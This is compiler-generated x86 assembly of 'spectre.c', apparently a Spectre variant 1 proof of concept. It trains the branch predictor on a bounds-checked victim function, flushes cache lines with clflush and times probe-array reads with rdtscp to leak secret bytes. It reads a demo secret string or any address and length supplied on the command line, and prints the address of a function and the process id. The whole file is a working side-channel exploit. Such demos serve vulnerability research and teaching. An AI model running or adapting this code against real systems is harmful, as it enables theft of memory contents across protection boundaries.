	.file	"spectre.c"
	.intel_syntax noprefix
	.text
	.p2align 4
	.globl	check
	.type	check, @function
check:
.LFB5562:
	.cfi_startproc
	call	__x86.get_pc_thunk.ax
	add	eax, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	mov	eax, DWORD PTR array1_size@GOTOFF[eax]
	cmp	eax, DWORD PTR 4[esp]
	seta	al
	movzx	eax, al
	ret
	.cfi_endproc
.LFE5562:
	.size	check, .-check
	.p2align 4
	.globl	test
	.type	test, @function
test:
.LFB5563:
	.cfi_startproc
	call	__x86.get_pc_thunk.ax
	add	eax, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	push	ebx
	.cfi_def_cfa_offset 8
	.cfi_offset 3, -8
	mov	edx, DWORD PTR 8[esp]
	mov	ecx, DWORD PTR 12[esp]
	mov	ebx, DWORD PTR array1_size@GOTOFF[eax]
	cmp	ebx, edx
	jbe	.L3
	cmp	BYTE PTR array1@GOTOFF[eax+edx], cl
	je	.L6
.L3:
	pop	ebx
	.cfi_remember_state
	.cfi_restore 3
	.cfi_def_cfa_offset 4
	ret
	.p2align 4,,10
	.p2align 3
.L6:
	.cfi_restore_state
	movzx	ecx, cl
	pop	ebx
	.cfi_restore 3
	.cfi_def_cfa_offset 4
	movzx	edx, BYTE PTR array2@GOTOFF[eax+ecx]
	and	BYTE PTR temp@GOTOFF[eax], dl
	ret
	.cfi_endproc
.LFE5563:
	.size	test, .-test
	.p2align 4
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5564:
	.cfi_startproc
	call	__x86.get_pc_thunk.ax
	add	eax, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	movzx	eax, BYTE PTR check_value@GOTOFF[eax]
	push	eax
	.cfi_def_cfa_offset 8
	push	DWORD PTR 8[esp]
	.cfi_def_cfa_offset 12
	call	test
	pop	eax
	.cfi_def_cfa_offset 8
	pop	edx
	.cfi_def_cfa_offset 4
	ret
	.cfi_endproc
.LFE5564:
	.size	victim_function, .-victim_function
	.p2align 4
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5565:
	.cfi_startproc
	push	ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	mov	ecx, 256
	push	edi
	.cfi_def_cfa_offset 12
	.cfi_offset 7, -12
	push	esi
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	call	__x86.get_pc_thunk.si
	add	esi, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	push	ebx
	.cfi_def_cfa_offset 20
	.cfi_offset 3, -20
	sub	esp, 92
	.cfi_def_cfa_offset 112
	mov	eax, DWORD PTR 116[esp]
	mov	DWORD PTR 52[esp], eax
	mov	eax, DWORD PTR 120[esp]
	lea	edi, results.0@GOTOFF[esi]
	mov	DWORD PTR 56[esp], eax
	mov	eax, DWORD PTR gs:20
	mov	DWORD PTR 76[esp], eax
	xor	eax, eax
	mov	DWORD PTR 20[esp], edi
	mov	DWORD PTR 68[esp], 0
	mov	DWORD PTR 48[esp], 999
	rep stosd
	lea	eax, 68[esp]
	lea	edi, array1_size@GOTOFF[esi]
	mov	DWORD PTR 44[esp], eax
	lea	eax, array2@GOTOFF[esi]
	mov	ebp, edi
	mov	DWORD PTR 40[esp], eax
	lea	eax, results.0@GOTOFF
	mov	DWORD PTR 60[esp], eax
.L9:
	mov	ecx, DWORD PTR 40[esp]
	mov	eax, ecx
	lea	edx, 131072[ecx]
.L10:
	clflush	[eax]
	add	eax, 512
	cmp	eax, edx
	jne	.L10
	mov	eax, DWORD PTR 48[esp]
	mov	ecx, DWORD PTR array1_size@GOTOFF[esi]
	mov	DWORD PTR 12[esp], 0
	cdq
	idiv	ecx
	mov	eax, DWORD PTR 112[esp]
	xor	eax, edx
	mov	edi, edx
	mov	DWORD PTR 8[esp], eax
.L16:
	movzx	eax, BYTE PTR 12[esp]
	mov	ebx, 29
	mov	BYTE PTR check_value@GOTOFF[esi], al
	mov	eax, ebp
	mov	ebp, edi
	mov	edi, eax
	.p2align 4,,10
	.p2align 3
.L12:
	clflush	[edi]
	mov	DWORD PTR 72[esp], 0
	mov	eax, DWORD PTR 72[esp]
	cmp	eax, 99
	jg	.L14
	.p2align 4,,10
	.p2align 3
.L11:
	mov	eax, DWORD PTR 72[esp]
	add	eax, 1
	mov	DWORD PTR 72[esp], eax
	mov	eax, DWORD PTR 72[esp]
	cmp	eax, 99
	jle	.L11
.L14:
	mov	eax, -1431655765
	mul	ebx
	mov	eax, ebx
	sub	ebx, 1
	shr	edx, 2
	lea	edx, [edx+edx*2]
	add	edx, edx
	sub	eax, edx
	sub	eax, 1
	mov	edx, eax
	shr	eax, 16
	xor	dx, dx
	or	eax, edx
	movzx	edx, BYTE PTR check_value@GOTOFF[esi]
	and	eax, DWORD PTR 8[esp]
	xor	eax, ebp
	push	edx
	.cfi_def_cfa_offset 116
	push	eax
	.cfi_def_cfa_offset 120
	call	test
	pop	eax
	.cfi_def_cfa_offset 116
	pop	edx
	.cfi_def_cfa_offset 112
	cmp	ebx, -1
	jne	.L12
	mov	eax, edi
	mov	edi, ebp
	mov	ebp, eax
	rdtscp
	mov	DWORD PTR 24[esp], eax
	mov	eax, DWORD PTR 44[esp]
	mov	DWORD PTR 28[esp], edx
	mov	DWORD PTR 16[esp], eax
	mov	DWORD PTR [eax], ecx
	mov	eax, DWORD PTR 40[esp]
	mov	ecx, DWORD PTR 12[esp]
	movzx	eax, BYTE PTR [eax+ecx]
	rdtscp
	mov	DWORD PTR 36[esp], edx
	mov	edx, DWORD PTR 16[esp]
	mov	DWORD PTR 32[esp], eax
	mov	eax, 50
	mov	DWORD PTR [edx], ecx
	mov	edx, DWORD PTR 32[esp]
	sub	edx, DWORD PTR 24[esp]
	mov	ecx, DWORD PTR 36[esp]
	sbb	ecx, DWORD PTR 28[esp]
	cmp	eax, edx
	mov	eax, 0
	sbb	eax, ecx
	jc	.L15
	mov	ecx, DWORD PTR 12[esp]
	add	DWORD PTR results.0@GOTOFF[esi+ecx*4], 1
.L15:
	add	DWORD PTR 12[esp], 1
	mov	eax, DWORD PTR 12[esp]
	cmp	eax, 256
	jne	.L16
	mov	eax, DWORD PTR 60[esp]
	xor	ecx, ecx
	mov	eax, DWORD PTR [eax+esi]
	mov	DWORD PTR 8[esp], eax
	mov	edx, eax
	mov	eax, 1
	jmp	.L18
.L43:
	cmp	ebx, -1
	je	.L23
	mov	edx, DWORD PTR 20[esp]
	cmp	edi, DWORD PTR [edx+ebx*4]
	cmovge	ebx, eax
.L17:
	mov	edi, DWORD PTR 20[esp]
	add	eax, 1
	mov	edx, DWORD PTR [edi+ecx*4]
	cmp	eax, 256
	je	.L42
.L18:
	mov	edi, DWORD PTR results.0@GOTOFF[esi+eax*4]
	cmp	edx, edi
	jg	.L43
	mov	ebx, ecx
	mov	ecx, eax
	jmp	.L17
.L23:
	mov	ebx, eax
	jmp	.L17
.L42:
	mov	eax, DWORD PTR [edi+ebx*4]
	lea	edi, 4[eax+eax]
	cmp	edi, edx
	jl	.L19
	cmp	edx, 2
	jne	.L25
	test	eax, eax
	je	.L19
.L25:
	sub	DWORD PTR 48[esp], 1
	jne	.L9
.L19:
	mov	eax, DWORD PTR 8[esp]
	xor	eax, DWORD PTR 68[esp]
	mov	ebp, ebx
	mov	ebx, ecx
	mov	ecx, DWORD PTR 52[esp]
	mov	edi, DWORD PTR 56[esp]
	mov	DWORD PTR results.0@GOTOFF[esi], eax
	mov	esi, DWORD PTR 20[esp]
	mov	BYTE PTR [ecx], bl
	mov	eax, DWORD PTR [esi+ebx*4]
	mov	DWORD PTR [edi], eax
	mov	eax, ebp
	mov	BYTE PTR 1[ecx], al
	mov	eax, DWORD PTR [esi+ebp*4]
	mov	DWORD PTR 4[edi], eax
	mov	eax, DWORD PTR 76[esp]
	sub	eax, DWORD PTR gs:20
	jne	.L44
	add	esp, 92
	.cfi_remember_state
	.cfi_def_cfa_offset 20
	pop	ebx
	.cfi_restore 3
	.cfi_def_cfa_offset 16
	pop	esi
	.cfi_restore 6
	.cfi_def_cfa_offset 12
	pop	edi
	.cfi_restore 7
	.cfi_def_cfa_offset 8
	pop	ebp
	.cfi_restore 5
	.cfi_def_cfa_offset 4
	ret
.L44:
	.cfi_restore_state
	call	__stack_chk_fail_local
	.cfi_endproc
.LFE5565:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"Success"
.LC1:
	.string	"Unclear"
	.section	.rodata.str1.4,"aMS",@progbits,1
	.align 4
.LC2:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1
.LC3:
	.string	"%p"
.LC4:
	.string	"%d"
	.section	.rodata.str1.4
	.align 4
.LC5:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC6:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.4
	.align 4
.LC7:
	.string	"Reading at malicious_x = %p secc= %c ..."
	.section	.rodata.str1.1
.LC8:
	.string	"%s: "
.LC9:
	.string	"0x%02X='%c' score=%d "
	.section	.rodata.str1.4
	.align 4
.LC10:
	.string	"(second best: 0x%02X='%c' score=%d)"
	.section	.rodata.str1.1
.LC11:
	.string	"\n"
.LC12:
	.string	"addr = %llx, pid = %d\n"
	.section	.text.startup,"ax",@progbits
	.p2align 4
	.globl	main
	.type	main, @function
main:
.LFB5566:
	.cfi_startproc
	lea	ecx, 4[esp]
	.cfi_def_cfa 1, 0
	and	esp, -16
	push	DWORD PTR -4[ecx]
	push	ebp
	mov	ebp, esp
	.cfi_escape 0x10,0x5,0x2,0x75,0
	push	edi
	push	esi
	push	ebx
	.cfi_escape 0x10,0x7,0x2,0x75,0x7c
	.cfi_escape 0x10,0x6,0x2,0x75,0x78
	.cfi_escape 0x10,0x3,0x2,0x75,0x74
	call	__x86.get_pc_thunk.bx
	add	ebx, OFFSET FLAT:_GLOBAL_OFFSET_TABLE_
	push	ecx
	.cfi_escape 0xf,0x3,0x75,0x70,0x6
	sub	esp, 104
	mov	eax, DWORD PTR [ecx]
	mov	DWORD PTR -104[ebp], eax
	mov	eax, DWORD PTR 4[ecx]
	mov	DWORD PTR -116[ebp], eax
	mov	eax, DWORD PTR gs:20
	mov	DWORD PTR -28[ebp], eax
	mov	eax, DWORD PTR stdin@GOT[ebx]
	mov	DWORD PTR -68[ebp], eax
	lea	eax, check@GOTOFF[ebx]
	mov	DWORD PTR -112[ebp], eax
	sar	eax, 31
	mov	DWORD PTR -108[ebp], eax
	.p2align 4,,10
	.p2align 3
.L46:
	mov	eax, DWORD PTR -68[ebp]
	sub	esp, 12
	push	DWORD PTR [eax]
	call	getc@PLT
	add	esp, 16
	cmp	al, 114
	je	.L64
	cmp	al, 10
	je	.L46
	cmp	al, 105
	jne	.L56
	call	getpid@PLT
	sub	esp, 12
	mov	edx, DWORD PTR -108[ebp]
	push	eax
	mov	eax, DWORD PTR -112[ebp]
	add	eax, 33
	adc	edx, 0
	push	edx
	push	eax
	lea	eax, .LC12@GOTOFF[ebx]
	push	eax
	push	1
	call	__printf_chk@PLT
	add	esp, 32
	jmp	.L46
.L64:
	mov	eax, DWORD PTR secret@GOTOFF[ebx]
	lea	edi, array1@GOTOFF[ebx]
	push	eax
	push	eax
	lea	eax, .LC2@GOTOFF[ebx]
	push	eax
	push	1
	call	__printf_chk@PLT
	mov	eax, DWORD PTR secret@GOTOFF[ebx]
	mov	edx, eax
	mov	DWORD PTR [esp], eax
	sub	edx, edi
	mov	DWORD PTR -48[ebp], edx
	call	strlen@PLT
	add	esp, 12
	mov	BYTE PTR check_value@GOTOFF[ebx], 1
	mov	DWORD PTR -44[ebp], eax
	mov	esi, eax
	lea	eax, array2@GOTOFF[ebx]
	push	131072
	push	1
	push	eax
	call	memset@PLT
	add	esp, 16
	cmp	DWORD PTR -104[ebp], 3
	je	.L65
.L48:
	sub	esp, 4
	lea	eax, .LC6@GOTOFF[ebx]
	push	esi
	push	eax
	push	1
	call	__printf_chk@PLT
	mov	eax, DWORD PTR -44[ebp]
	add	esp, 16
	sub	eax, 1
	mov	DWORD PTR -44[ebp], eax
	test	eax, eax
	js	.L46
	lea	eax, .LC7@GOTOFF[ebx]
	mov	DWORD PTR -60[ebp], 0
	mov	DWORD PTR -80[ebp], eax
	lea	eax, -40[ebp]
	mov	DWORD PTR -72[ebp], eax
	lea	eax, -30[ebp]
	mov	DWORD PTR -76[ebp], eax
	lea	eax, .LC8@GOTOFF[ebx]
	mov	DWORD PTR -84[ebp], eax
	lea	eax, .LC9@GOTOFF[ebx]
	mov	DWORD PTR -92[ebp], eax
	lea	eax, .LC11@GOTOFF[ebx]
	mov	DWORD PTR -88[ebp], eax
	lea	eax, .LC1@GOTOFF[ebx]
	mov	DWORD PTR -100[ebp], eax
	lea	eax, .LC0@GOTOFF[ebx]
	mov	DWORD PTR -96[ebp], eax
	.p2align 4,,10
	.p2align 3
.L49:
	mov	edi, DWORD PTR -60[ebp]
	mov	eax, DWORD PTR secret@GOTOFF[ebx]
	mov	esi, 63
	movsx	eax, BYTE PTR [eax+edi]
	add	edi, 1
	push	eax
	push	DWORD PTR -48[ebp]
	push	DWORD PTR -80[ebp]
	push	1
	call	__printf_chk@PLT
	mov	eax, DWORD PTR -48[ebp]
	add	esp, 12
	push	DWORD PTR -72[ebp]
	push	DWORD PTR -76[ebp]
	push	eax
	lea	edx, 1[eax]
	mov	DWORD PTR -60[ebp], edi
	mov	DWORD PTR -48[ebp], edx
	call	readMemoryByte
	mov	edi, DWORD PTR -36[ebp]
	mov	edx, DWORD PTR -40[ebp]
	add	esp, 12
	lea	eax, [edi+edi]
	mov	DWORD PTR -64[ebp], edx
	cmp	edx, eax
	mov	eax, DWORD PTR -100[ebp]
	cmovge	eax, DWORD PTR -96[ebp]
	push	eax
	push	DWORD PTR -84[ebp]
	push	1
	call	__printf_chk@PLT
	movzx	ecx, BYTE PTR -30[ebp]
	mov	edx, DWORD PTR -64[ebp]
	mov	eax, ecx
	mov	DWORD PTR [esp], edx
	sub	eax, 32
	cmp	al, 95
	mov	eax, esi
	cmovb	eax, ecx
	push	eax
	push	ecx
	push	DWORD PTR -92[ebp]
	push	1
	call	__printf_chk@PLT
	add	esp, 32
	test	edi, edi
	jle	.L53
	movzx	edx, BYTE PTR -29[ebp]
	mov	eax, edx
	sub	eax, 32
	cmp	al, 95
	lea	eax, .LC10@GOTOFF[ebx]
	cmovb	esi, edx
	sub	esp, 12
	push	edi
	push	esi
	push	edx
	push	eax
	push	1
	call	__printf_chk@PLT
	add	esp, 32
.L53:
	sub	esp, 8
	push	DWORD PTR -88[ebp]
	push	1
	call	__printf_chk@PLT
	mov	eax, DWORD PTR -44[ebp]
	add	esp, 16
	sub	eax, 1
	mov	DWORD PTR -44[ebp], eax
	test	eax, eax
	jns	.L49
	jmp	.L46
.L56:
	mov	eax, DWORD PTR -28[ebp]
	sub	eax, DWORD PTR gs:20
	jne	.L66
	lea	esp, -16[ebp]
	xor	eax, eax
	pop	ecx
	.cfi_remember_state
	.cfi_restore 1
	.cfi_def_cfa 1, 0
	pop	ebx
	.cfi_restore 3
	pop	esi
	.cfi_restore 6
	pop	edi
	.cfi_restore 7
	pop	ebp
	.cfi_restore 5
	lea	esp, -4[ecx]
	.cfi_def_cfa 4, 4
	ret
.L65:
	.cfi_restore_state
	mov	esi, DWORD PTR -116[ebp]
	push	eax
	lea	eax, -48[ebp]
	push	eax
	lea	eax, .LC3@GOTOFF[ebx]
	push	eax
	push	DWORD PTR 4[esi]
	call	__isoc99_sscanf@PLT
	add	esp, 12
	lea	eax, -44[ebp]
	sub	DWORD PTR -48[ebp], edi
	push	eax
	lea	eax, .LC4@GOTOFF[ebx]
	push	eax
	push	DWORD PTR 8[esi]
	call	__isoc99_sscanf@PLT
	lea	eax, .LC5@GOTOFF[ebx]
	push	DWORD PTR -44[ebp]
	push	DWORD PTR -48[ebp]
	push	eax
	push	1
	call	__printf_chk@PLT
	mov	esi, DWORD PTR -44[ebp]
	add	esp, 32
	jmp	.L48
.L66:
	call	__stack_chk_fail_local
	.cfi_endproc
.LFE5566:
	.size	main, .-main
	.local	results.0
	.comm	results.0,1024,32
	.globl	check_value
	.data
	.type	check_value, @object
	.size	check_value, 1
check_value:
	.byte	1
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.globl	secret
	.section	.rodata.str1.4
	.align 4
.LC13:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 4
	.type	secret, @object
	.size	secret, 4
secret:
	.long	.LC13
	.globl	array2
	.bss
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.zero	131072
	.globl	unused2
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.section	.text.__x86.get_pc_thunk.ax,"axG",@progbits,__x86.get_pc_thunk.ax,comdat
	.globl	__x86.get_pc_thunk.ax
	.hidden	__x86.get_pc_thunk.ax
	.type	__x86.get_pc_thunk.ax, @function
__x86.get_pc_thunk.ax:
.LFB5567:
	.cfi_startproc
	mov	eax, DWORD PTR [esp]
	ret
	.cfi_endproc
.LFE5567:
	.section	.text.__x86.get_pc_thunk.bx,"axG",@progbits,__x86.get_pc_thunk.bx,comdat
	.globl	__x86.get_pc_thunk.bx
	.hidden	__x86.get_pc_thunk.bx
	.type	__x86.get_pc_thunk.bx, @function
__x86.get_pc_thunk.bx:
.LFB5568:
	.cfi_startproc
	mov	ebx, DWORD PTR [esp]
	ret
	.cfi_endproc
.LFE5568:
	.section	.text.__x86.get_pc_thunk.si,"axG",@progbits,__x86.get_pc_thunk.si,comdat
	.globl	__x86.get_pc_thunk.si
	.hidden	__x86.get_pc_thunk.si
	.type	__x86.get_pc_thunk.si, @function
__x86.get_pc_thunk.si:
.LFB5569:
	.cfi_startproc
	mov	esi, DWORD PTR [esp]
	ret
	.cfi_endproc
.LFE5569:
	.hidden	__stack_chk_fail_local
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
